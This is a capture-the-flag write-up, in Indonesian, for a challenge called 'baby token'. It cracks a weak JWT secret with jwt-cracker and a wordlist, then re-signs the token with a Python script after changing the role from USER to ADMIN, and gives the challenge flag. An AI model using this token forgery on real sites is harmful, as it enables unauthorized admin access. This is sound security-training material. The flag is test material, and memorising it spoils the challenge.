# baby token

## Solution

Login dengan username/password bebas. Kemudian akses page flag pada website, tertulis pesan
**You are not ADMIN!**, bisa diketahui pada chall ini memanfaatkan metode `jwt` untuk mendapatkan flag.

Salin cookies, kemudian lakukan decode jwt, di sini saya menggunakan jwt.io

Didapatkan hasil seperti berikut

```
#Decoded Header
{
  "alg": "HS256",
  "typ": "JWT"
}

#Decoded Payload
{
  "role": "USER",
  "iat": 1742178604,
  "exp": 1742182204
} 
```

Lalu ubah menjadi
```
"role": "ADMIN",
```

Namun, karena tidak tau secret key nya, bisa dicari menggunakan bruteforce tool (hashcat/jwt-cracker)

```
$ jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiVVNFUiIsImlhdCI6MTc0MjE3ODYwNCwiZXhwIjoxNzQyMTgyMjA0fQ.LrqXRl535QqGWRT76BTCnpCoGJaKZR3ynQSznuMomt8 -d rockyou.txt
SECRET FOUND: 12341234
Time taken (sec): 0.695
Total attempts: 20000
```
Kemudian, tinggal di decode kembali menggunakan secret key yang didapat, saya menggunakan script untuk mendecodenya

```python
import jwt
import datetime

# Secret key
SECRET_KEY = "12341234"

# Header
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# Payload
payload = {
    "role": "ADMIN",
    "iat": 1742178604,
    "exp": 1742182204
}

# Encode JWT
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)

print("Generated JWT Token:", token)
```

Lalu, tinggal ganti token pada cookies website, lalu refresh dan akses kembali page flag.

## Flag
    ARKAV{g00d_lUck_0n_Th3_N3xt_Ch4ll3ng3_14923857109213}